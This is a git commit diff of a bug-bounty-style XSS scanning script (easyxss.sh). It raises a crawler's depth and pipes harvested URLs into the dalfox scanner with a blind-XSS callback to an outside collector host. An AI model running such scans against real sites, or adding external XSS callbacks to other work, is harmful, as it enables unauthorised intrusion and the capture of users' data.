db16842f429f6ad94979fdc7e1cfae1f600dfb76
huzaifahere <47252676+huzaifahere@users.noreply.github.com>
2020-08-20 09:21:30 +0500

    Update easyxss.sh

--- easyxss.sh
+++ easyxss.sh
@@ -7,7 +7,7 @@ logo
 gather_js(){
 echo -e "\n\e[36m[\e[32m+\e[36m]\e[92m Getting urls for XSS\e[0m\n";
 cat $target | waybackurls >>  wayback.txt
-cat $target | hakrawler -depth 1 -plain >> spider.txt
+cat $target | hakrawler -depth 5 -plain >> spider.txt
 cat wayback.txt >> all.txt
 cat spider.txt >> all.txt
 cat all.txt  | grep "=" | dalfox pipe -blind https://huz.xss.ht >> dalfox_result.txt
